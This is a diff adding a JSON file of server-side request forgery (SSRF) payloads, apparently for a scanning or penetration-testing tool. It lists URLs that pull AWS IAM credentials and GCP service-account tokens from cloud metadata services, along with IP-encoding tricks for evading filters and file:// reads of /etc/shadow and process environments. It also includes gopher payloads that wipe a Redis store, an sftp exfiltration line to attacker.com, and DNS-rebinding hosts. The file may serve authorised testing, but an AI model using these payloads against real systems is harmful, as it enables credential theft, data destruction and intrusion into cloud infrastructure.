@@ -1,0 +1,67 @@
+{
+  "category": "ssrf",
+  "contexts": {
+    "aws": {
+      "description": "SSRF payloads targeting AWS EC2 instance metadata service (IMDS)",
+      "payloads": [
+        {"payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS IMDSv1 root metadata endpoint", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "IAM role listing endpoint", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole", "description": "IAM credentials retrieval (replace role name)", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/latest/user-data", "description": "EC2 user-data (may contain secrets)", "waf_bypass": false},
+        {"payload": "http://[::ffff:169.254.169.254]/latest/meta-data/", "description": "IPv6-mapped IPv4 IMDSv1 bypass", "waf_bypass": true},
+        {"payload": "http://169.254.169.254.nip.io/latest/meta-data/", "description": "nip.io DNS-based IP bypass", "waf_bypass": true},
+        {"payload": "http://0xa9fea9fe/latest/meta-data/", "description": "Hex-encoded 169.254.169.254", "waf_bypass": true},
+        {"payload": "http://2852039166/latest/meta-data/", "description": "Decimal IP representation of 169.254.169.254", "waf_bypass": true},
+        {"payload": "http://169.254.169.254/latest/meta-data/hostname", "description": "Instance hostname via metadata", "waf_bypass": false}
+      ]
+    },
+    "gcp": {
+      "description": "SSRF payloads targeting Google Cloud Platform metadata service",
+      "payloads": [
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata root (requires Metadata-Flavor: Google header)", "waf_bypass": false},
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "GCP default service account OAuth token", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "description": "GCP metadata via IP address", "waf_bypass": false},
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "description": "GCP project ID retrieval", "waf_bypass": false},
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", "description": "GKE kubernetes environment config (if running on GKE)", "waf_bypass": false}
+      ]
+    },
+    "internal": {
+      "description": "SSRF payloads targeting internal network services",
+      "payloads": [
+        {"payload": "http://127.0.0.1/", "description": "Localhost IPv4", "waf_bypass": false},
+        {"payload": "http://0.0.0.0/", "description": "All-interfaces address (routes to localhost on most systems)", "waf_bypass": false},
+        {"payload": "http://[::1]/", "description": "IPv6 localhost", "waf_bypass": false},
+        {"payload": "http://localhost/", "description": "Localhost hostname", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:8080/", "description": "Common internal web port 8080", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:3000/", "description": "Common dev server port 3000", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:9200/", "description": "Elasticsearch default port", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:6379/", "description": "Redis default port", "waf_bypass": false},
+        {"payload": "http://127.0.0.1:27017/", "description": "MongoDB default port", "waf_bypass": false},
+        {"payload": "http://192.168.1.1/", "description": "Common internal gateway", "waf_bypass": false},
+        {"payload": "http://10.0.0.1/", "description": "Common private network gateway", "waf_bypass": false}
+      ]
+    },
+    "protocol": {
+      "description": "SSRF payloads using alternative URI schemes",
+      "payloads": [
+        {"payload": "file:///etc/passwd", "description": "Local file read via file:// scheme", "waf_bypass": false},
+        {"payload": "file:///etc/shadow", "description": "Shadow file read via file:// scheme", "waf_bypass": false},
+        {"payload": "file:///proc/self/environ", "description": "Process environment variables via /proc", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "description": "Gopher protocol to Redis flushall", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$10%0d%0ahelloworld%0d%0a", "description": "Gopher protocol to Redis SET command", "waf_bypass": false},
+        {"payload": "dict://127.0.0.1:6379/info", "description": "dict:// protocol to Redis INFO", "waf_bypass": false},
+        {"payload": "sftp://attacker.com:2222/", "description": "SFTP scheme to exfiltrate via outbound connection", "waf_bypass": false},
+        {"payload": "ldap://127.0.0.1:389/", "description": "LDAP scheme to internal LDAP server", "waf_bypass": false}
+      ]
+    },
+    "dns_rebind": {
+      "description": "DNS rebinding and time-of-check bypass payloads",
+      "payloads": [
+        {"payload": "http://make-<random>.1u.ms/", "description": "1u.ms DNS rebind service (resolves to 127.0.0.1 after first response)", "waf_bypass": true},
+        {"payload": "http://<collaborator-id>.burpcollaborator.net/", "description": "Burp Collaborator for SSRF OOB detection", "waf_bypass": false},
+        {"payload": "http://169.254.169.254.attacker.com/", "description": "DNS wildcard resolving to metadata IP", "waf_bypass": true},
+        {"payload": "http://127.0.0.1.attacker.com/", "description": "DNS wildcard resolving to localhost", "waf_bypass": true}
+      ]
+    }
+  }
+}
